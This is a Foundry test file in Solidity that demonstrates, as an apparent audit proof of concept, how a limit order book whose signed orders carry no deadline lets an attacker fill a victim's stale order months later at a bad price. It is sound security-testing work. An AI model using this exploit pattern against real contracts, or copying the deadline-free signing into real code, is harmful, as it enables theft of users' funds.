// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Test.sol";

import "../src/DexOrderBookDeadline.sol";
import "./mocks/MockERC20.sol";

contract LimitOrderBookDeadlineDexTest is Test {
    LimitOrderBook public book;

    MockERC20 public WETH;
    MockERC20 public USDC;

    uint256 alicePrivateKey;
    address alice;

    address attacker;

    uint256 constant ETH_AMOUNT = 10 ether;

    // 20_000 USDC 
    uint256 constant MIN_USDC = 20_000e6;

    // Alice intended the order to live for only 1 hour.
    uint256 constant ORDER_DURATION = 1 hours;


    function setUp() public {
        alicePrivateKey = 0xA11CE;
        alice = vm.addr(alicePrivateKey);

        attacker = makeAddr("attacker");

        book = new LimitOrderBook();

        WETH = new MockERC20("Wrapped Ether", "WETH");
        USDC = new MockERC20("USD Coin", "USDC");

        // Give Alice 10 WETH;
        WETH.mint(alice, ETH_AMOUNT);

        // Give Attacker enough USDC to purchase WETH
        USDC.mint(attacker, MIN_USDC);

        // Alice approves the order book
        vm.prank(alice);
        WETH.approve(address(book), type(uint256).max);

        // Attacker approves order book
        vm.prank(attacker);
        USDC.approve(address(book), type(uint256).max);
    }


    function test_staleOrderCanBeExecutedMonthsLater() public {
        /*
         * ------------------------------------------------------------
         * DAY 0
         * ------------------------------------------------------------
         *
         * Alice creates a limit order:
         *
         * Sell 10 WETH
         * Receive at least 20,000 USDC
         *
         * Alice's INTENDED lifetime:
         *
         * now -> +1 hour
         *
         * BUT:
         *
         * deadline is NOT included in the signed message.
         */

        LimitOrderBook.Order memory order = LimitOrderBook.Order({
            maker: alice,
            tokenIn: address(WETH),
            tokenOut: address(USDC),
            amountIn: ETH_AMOUNT,
            minAmountOut: MIN_USDC
        });

        uint256 createdAt = block.timestamp;
        uint256 intendedDeadline = createdAt + ORDER_DURATION;

        // Build exactly the same hash used by fillOrder();
        bytes32 orderHash = keccak256(
            abi.encode(
                order.maker,
                order.tokenIn,
                order.tokenOut,
                order.amountIn,
                order.minAmountOut
            )
        );

        // Contract expects:
        //
        // ethHash = keccak256(
        //     "\x19Ethereum Signed Message:\n32" || orderHash
        // )
        //
        // because of:
        //
        // orderHash.toEthSignedMessageHash()
        bytes32 ethHash = MessageHashUtils.toEthSignedMessageHash(orderHash);

        // Alice signs the order
        (uint8 v, bytes32 r, bytes32 s) = 
            vm.sign(alicePrivateKey, ethHash);

        bytes memory signature = 
            abi.encodePacked(r, s, v);

        // Confirm the signature really 
        assertEq(ECDSA.recover(ethHash, signature), alice);

        /*
         * ------------------------------------------------------------
         * ONE HOUR PASSES
         * ------------------------------------------------------------
         */

        vm.warp(intendedDeadline + 1);

        assertGt(block.timestamp, intendedDeadline);

         /*
         * At this point Alice's intended order window has expired.
         *
         * A secure implementation should reject the order here.
         *
         * The vulnerable implementation has NO deadline check.
         */

        /*
         * ------------------------------------------------------------
         * THREE MONTHS LATER
         * ------------------------------------------------------------
         */

        vm.warp(createdAt + 90 days);

        assertGt(block.timestamp, intendedDeadline);

         /*
         * Attacker executes the stale order.
         *
         * They pay only the minimum amount Alice requested:
         *
         * 10 WETH -> 20,000 USDC
         */

        vm.prank(attacker);

        book.fillOrder(
            order,
            MIN_USDC,
            signature
        );

         /*
         * ------------------------------------------------------------
         * IMPACT
         * ------------------------------------------------------------
         */

        // Alice's WETH have been sold, the 10 ETH
        assertEq(WETH.balanceOf(alice), 0);

        // Alice received only the minimum 20_000 USDC, while the WETH price is 40_000 USDC;
        assertEq(USDC.balanceOf(alice), MIN_USDC);

        // Attacker received Alice's 10 WETH;
        assertEq(WETH.balanceOf(attacker), ETH_AMOUNT);

        // Attacker paid exactly 20,000 USDC
        assertEq(USDC.balanceOf(attacker), 0);

        // The order is now marked filled.
        assertTrue(book.isOrderFilled(orderHash));
    }
}
